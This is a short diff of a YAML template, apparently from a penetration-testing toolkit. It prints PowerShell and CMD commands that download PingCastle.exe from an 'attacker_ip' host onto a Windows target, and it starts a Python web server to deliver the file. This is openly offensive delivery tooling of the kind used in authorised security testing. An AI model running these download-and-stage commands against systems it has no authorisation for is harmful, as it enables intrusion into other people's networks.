@@ -1,3 +1,4 @@
+---
 metadata:
   filename: "deliver-windows-pingcastle.yaml"
   tags: ["windows", "privesc", "domain"]
@@ -11,6 +12,6 @@ content: |
   echo 'Deliver: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/PingCastle.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\PingCastle.exe'; \
   echo '================================================================'; \
   echo '                         -----CMD-----                          '; \
-  echo 'Deliver: powershell wget -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/PingCastle.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\PingCastle.exe'; 
+  echo 'Deliver: powershell wget -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/PingCastle.exe -Outfile <%=$(esh variables/delivery_path_windows)%>\PingCastle.exe'; \
   echo '================================================================'; \
   python -m http.server <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
